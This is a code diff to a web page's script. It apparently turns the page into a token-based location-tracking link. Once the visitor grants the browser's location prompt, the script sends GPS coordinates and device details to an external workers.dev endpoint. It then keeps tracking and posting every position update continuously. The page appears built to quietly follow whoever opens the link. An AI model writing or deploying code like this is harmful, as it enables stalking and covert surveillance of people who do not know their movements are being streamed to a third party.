@@ -396,94 +396,85 @@ document.getElementById("p-i").textContent =
   letters[Math.floor(Math.random()*letters.length)];
 </script>
 
+
 <script>
+/* ================= CONFIG ================= */
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const token = new URLSearchParams(location.search).get("token");
 if(!token){ alert("Invalid link"); throw "NO TOKEN"; }
 
-const API = location.origin;
+const mapFrame = document.getElementById("mapFrame");
 const statusEl = document.getElementById("status");
 
-/* Advanced device info */
-function getDeviceInfo(){
+/* Device info */
+function deviceInfo(){
   return {
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    language: navigator.language,
-    screen: `${screen.width}x${screen.height}`,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    ua:navigator.userAgent,
+    lang:navigator.language,
+    screen:`${screen.width}x${screen.height}`
   };
 }
 
-document.getElementById("allow").onclick = () => {
-
-  // show loader instantly (UX improvement)
-  document.getElementById("permission").classList.add("loading");
-  document.getElementById("loader").style.display = "block";
+/* CLICK */
+document.getElementById("allowBtn").onclick = ()=>{
   if(!navigator.geolocation){
-    statusEl.textContent = "Location not supported on this device";
+    statusEl.textContent="Location not supported";
     return;
   }
 
-  statusEl.textContent = "Requesting GPS permission…";
+  statusEl.textContent="Requesting location…";
 
- navigator.geolocation.watchPosition(
-
+  navigator.geolocation.getCurrentPosition(
     success,
     error,
-    { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
+    { enableHighAccuracy:true, timeout:20000, maximumAge:0 }
   );
 };
 
+/* SUCCESS */
 function success(pos){
-  document.getElementById("loader").style.display="none";
+  const {latitude,longitude,accuracy} = pos.coords;
 
-  const { latitude:lat, longitude:lng, accuracy:acc } = pos.coords;
+  // Update map instantly
+  mapFrame.src =
+   `https://www.google.com/maps?q=${latitude},${longitude}&z=18&output=embed`;
 
-  /* Send FIRST accurate location immediately */
-  fetch(API + "/send-location",{
+  // Send first hit
+  fetch(API+"/send-location",{
     method:"POST",
-    headers:{ "Content-Type":"application/json" },
+    headers:{"Content-Type":"application/json"},
     body:JSON.stringify({
       token,
-      lat, lng, acc,
-      device: getDeviceInfo()
+      lat:latitude,
+      lng:longitude,
+      acc:accuracy,
+      device:deviceInfo()
     })
   });
 
   document.getElementById("permission").remove();
 
-  /* Continuous tracking */
-  navigator.geolocation.watchPosition(
-    p=>{
-      fetch(API + "/send-location",{
-        method:"POST",
-        headers:{ "Content-Type":"application/json" },
-        body:JSON.stringify({
-          token,
-          lat:p.coords.latitude,
-          lng:p.coords.longitude,
-          acc:p.coords.accuracy
-        })
-      });
-    },
-    ()=>{},
-    { enableHighAccuracy:true, maximumAge:0 }
-  );
+  // Continuous tracking
+  navigator.geolocation.watchPosition(p=>{
+    fetch(API+"/send-location",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({
+        token,
+        lat:p.coords.latitude,
+        lng:p.coords.longitude,
+        acc:p.coords.accuracy
+      })
+    });
+  },()=>{}, {enableHighAccuracy:true});
 }
 
+/* ERROR */
 function error(e){
-  document.getElementById("loader").style.display="none";
-document.getElementById("permission").classList.remove("loading");
-
-  if(e.code === 1){
-    statusEl.textContent =
-      "Location access denied. Please enable GPS and allow permission.";
-  }else{
-    statusEl.textContent =
-      "Unable to get location. Turn ON GPS and try again.";
-      document.getElementById("allow").textContent="Retry";
-  }
+  statusEl.textContent =
+    "Enable GPS & allow location permission";
 }
+</script>
 
 </script>
 
